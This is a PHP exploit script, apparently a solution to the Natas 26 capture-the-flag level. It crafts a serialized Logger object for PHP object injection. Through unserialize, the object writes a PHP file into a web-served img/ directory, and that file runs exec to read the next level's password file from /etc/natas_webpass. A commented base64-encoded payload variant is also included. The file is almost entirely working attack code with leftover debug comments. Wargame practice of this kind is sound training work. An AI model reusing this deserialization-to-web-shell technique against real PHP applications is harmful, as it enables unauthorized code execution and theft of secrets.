<?php
    class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;
      
        function __construct($file){
            // initialise variables
            $this->initMsg="#--session started--#\n";
            // $this->exitMsg="#--session end--#\n";
            $this->exitMsg="
            <?php 
                echo '\n'; echo exec(\"cat /etc/natas_webpass/natas27\"); 
            ?>\n
            ";
            // $this->logFile = "/tmp/natas26_" . $file . ".log";
            $this->logFile = "img/natas26_lyr_exploit.php";
            // $this->logFile = "img/asdf";
      
            // write initial message
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$initMsg);
            // fclose($fd);
        }                       
      
        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }                       
      
        function __destruct(){
            // print "Destructing";
            // print $this->exitMsg;
            // write exit message
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$this->exitMsg);
            // fclose($fd);
        }                       
    }
    $in = [new Logger("asdf")];

    // echo "\n";

    $in = serialize($in);
    print $in;

    // $in = 'O:6:"Logger":3:{s:7:"logFile";s:21:"/tmp/natas26_asdf.log";s:13:"LoggerinitMsg";s:20:"#--ession started--#";s:7:"exitMsg";s:16:"#--ession end--#";}';
    // $in = 'O:6:"Logger":3:{s:7:"logFile";s:19:"/tmp/natas_asdf.log";s:7:"initMsg";s:4:"asdf";s:7:"exitMsg";s:4:"asdf";}';

    // echo base64_encode($in);

    // $drawing = 'O:6:"Logger":3:{s:13:"LoggerlogFile";s:2:"as";s:13:"LoggerinitMsg";s:4:"asdf";s:13:"LoggerexitMsg";s:2:"as";}';
    // $t = unserialize($drawing);
    $t = unserialize($in);
    // $t = unserialize(base64_decode('Tzo2OiJMb2dnZXIiOjM6e3M6MTM6IkxvZ2dlcmxvZ0ZpbGUiO3M6Mzg6ImltZy9uYXRhczI2X29ic3ExMnE1M2IwOXBqdWhoZDI1N3Y2bmQzIjtzOjEzOiJMb2dnZXJpbml0TXNnIjtzOjQ6ImFzZGYiO3M6MTM6IkxvZ2dlcmV4aXRNc2ciO3M6MTg6Ijw/cGhwIGVjaG8gdGVzdCA/PiI7fQ=='))

?>